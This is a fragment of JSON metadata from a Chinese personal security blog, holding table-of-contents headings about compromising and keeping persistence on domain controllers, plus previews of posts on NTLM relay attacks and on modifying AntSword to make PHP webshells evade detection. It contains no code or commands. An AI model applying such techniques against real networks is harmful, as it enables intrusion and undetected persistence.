href=\"#%E5%B3%B0%E5%9B%9E%E8%B7%AF%E8%BD%AC%EF%BC%9A%EF%BC%88DC2%E5%AD%90%E5%9F%9F%E6%8E%A7%E4%B8%8A%E7%BA%BF%EF%BC%89\"><span class=\"toc-text\">峰回路转：（DC2子域控上线）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#DC2%E5%AD%90%E5%9F%9F%E6%8E%A7%E4%B8%8A%E7%BA%BF%E8%BF%87%E7%A8%8B%EF%BC%9A\"><span class=\"toc-text\">DC2子域控上线过程：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#DC2%E5%AD%90%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9A\"><span class=\"toc-text\">DC2子域权限维持：</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%85%B6%E4%BB%96%E5%9F%9F%E6%8E%A7%E4%B8%8A%E7%BA%BF\"><span class=\"toc-text\">其他域控上线</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93%EF%BC%9A\"><span class=\"toc-text\">总结：</span></a></li></ol>","author":{"name":"Q16G","slug":"blog-author","avatar":"https://www.helloimg.com/images/2023/05/23/oJaeo5.jpg","link":"/","description":"一个潜心学习网络安全的大学生","socials":{"github":"https://github.com/Q16G","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_57222016?spm=1018.2226.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"NTLM-Relay攻击","uid":"87b274fadad0a6b05fd4814550be9f11","slug":"NTLM-Relay攻击","date":"2023-05-24T04:12:28.000Z","updated":"2023-05-25T08:06:43.763Z","comments":true,"path":"api/articles/NTLM-Relay攻击.json","keywords":null,"cover":"https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201505%2F31%2F20150531134332_s4dxn.thumb.700_0.jpeg&refer=http%3A%2F%2Fb-ssl.duitang.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1687593990&t=c2298c6d35596afce3b266d2ab766151","text":"前言介绍 NTLM认证分为本地认证和网络认证，当我们开机登陆用户账号的时候，就需要将lsass中的密码转换为明文hash与sam文件中进行对比，这种方式就是本地认证。 而当我们访问局域网中的一台主机的SMB共享的时候，需要提供凭证才能进行访问，这个过程就是网络认证。 NTLM协议...","link":"","photos":[],"count_time":{"symbolsCount":"4k","symbolsTime":"4 mins."},"categories":[],"tags":[{"name":"内网渗透","slug":"内网渗透","count":2,"path":"api/tags/内网渗透.json"}],"author":{"name":"Q16G","slug":"blog-author","avatar":"https://www.helloimg.com/images/2023/05/23/oJaeo5.jpg","link":"/","description":"一个潜心学习网络安全的大学生","socials":{"github":"https://github.com/Q16G","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_57222016?spm=1018.2226.3001.5343","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"phpwebshell免杀","uid":"0bde8e350134ac3c0961afd29aadf7f8","slug":"phpwebshell免杀","date":"2023-05-24T02:40:14.000Z","updated":"2023-05-25T08:12:35.745Z","comments":true,"path":"api/articles/phpwebshell免杀.json","keywords":null,"cover":"https://img2.baidu.com/it/u=529079173,3290078057&fm=253&fmt=auto&app=120&f=JPEG?w=640&h=384","text":"AntSword0x00 前言：为什么会有改造蚁剑的想法，之前看到有做冰蝎的流量加密，来看到绕过waf，改造一些弱特征，通过流量转换，跳过密钥交互。但是，冰蝎需要反编译去改造源码，再进行修复bug，也比较复杂。而AntSword相对于冰蝎来说，不限制webshell，即一句话也可...","link":"","photos":[],"count_time":{"symbolsCount":"4.1k","symbolsTime":"4 mins."},"categories":[],"tags":[{"name":"免杀","slug":"免杀","count":1,"path":"api/tags/免杀.json"}],"author":{"name":"Q16G","slug":"blog-author","avatar":"https://www.helloimg.com/images/2023/05/23/oJaeo5.jpg","link":"/","description":"一个潜心学习网络安全的大学生","socials":{"github":"https://github.com/Q16G","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_57222016?spm=1018.2226.3001.5343","juejin":"","customs":{}}}}}